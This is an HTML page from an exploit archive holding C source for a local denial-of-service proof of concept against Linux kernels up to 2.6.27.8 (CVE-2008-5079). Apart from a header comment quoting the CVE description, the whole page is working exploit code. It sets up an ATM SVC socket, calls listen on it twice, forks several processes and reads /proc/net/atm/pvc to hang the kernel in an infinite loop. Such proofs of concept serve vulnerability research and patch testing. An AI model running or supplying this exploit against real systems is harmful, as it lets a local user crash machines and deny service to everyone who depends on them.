<html><head><title>Linux Kernel <= 2.6.27.8 ATMSVC Local Denial of Service Exploit</title></head><pre>/*
 * cve-2008-5079.c
 *
 * Linux Kernel &lt;= 2.6.27.8 ATMSVC local DoS
 * Jon Oberheide &lt;jon@oberheide.org&gt;
 *
 * http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5079:
 *
 *   net/atm/svc.c in the ATM subsystem in the Linux kernel 2.6.27.8
 *   and earlier allows local users to cause a denial of service  
 *   (kernel infinite loop) by making two calls to svc_listen for the
 *   same socket, and then reading a /proc/net/atm/*vc file, related  
 *   to corruption of the vcc table.  
 *
 */
 
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;linux/atm.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/stat.h&gt;
 
#define NR_CPUS 8
#define PROC_ATM &quot;/proc/net/atm/pvc&quot;
 
int
main(void)
{
    char *err, dummy[1024];
    int i, ret, sock, proc;
    struct atm_qos qos;
    struct sockaddr_atmsvc addr;
 
    printf(&quot;[+] creating ATM socket...\n&quot;);
 
    sock = socket(PF_ATMSVC, SOCK_DGRAM, 0);
    if (sock &lt; 0) {
        err = &quot;socket(2) for type PF_ATMSVC failed&quot;;
        printf(&quot;[-] PoC error: %s (%s)\n&quot;, err, strerror(errno));
        return 1;
    }
 
    memset(&amp;qos, 0, sizeof(qos));
    qos.rxtp.traffic_class = ATM_UBR;
    qos.txtp.traffic_class = ATM_UBR;
    qos.aal = ATM_NO_AAL;
 
    printf(&quot;[+] setting socket QoS options...\n&quot;);
 
    ret = setsockopt(sock, SOL_ATM, SO_ATMQOS, &amp;qos, sizeof(qos));
    if (ret == -1) {
        err = &quot;setsockopt(2) for option SO_ATMQOS failed&quot;;
        printf(&quot;[-] PoC error: %s (%s)\n&quot;, err, strerror(errno));
        return 1;
    }
 
    memset(&amp;addr, 0, sizeof(addr));
    addr.sas_family = AF_ATMSVC;
 
    printf(&quot;[+] binding socket...\n&quot;);
 
    bind(sock, (struct sockaddr *) &amp;addr, sizeof(addr));
 
    printf(&quot;[+] socket listen...\n&quot;);
 
    listen(sock, 10);
 
    printf(&quot;[+] duplicate socket listen...\n&quot;);
 
    listen(sock, 10);
 
    printf(&quot;[+] attempting local DoS...\n&quot;);
 
    for (i = 0; i &lt; NR_CPUS; ++i) {
        if (fork() != 0) {
            break;
        }
    }
 
    proc = open(PROC_ATM, O_RDONLY);
    if (proc == -1) {
        err = &quot;opening &quot; PROC_ATM &quot; failed&quot;;
        printf(&quot;[-] PoC error: %s (%s)\n&quot;, err, strerror(errno));
        return 1;
    }
    ret = read(proc, &amp;dummy, 1024);
    close(proc);
    
    printf(&quot;[-] Local DoS failed.\n&quot;);
 
    return 0;
}

// milw0rm.com [2008-12-10]</pre></html>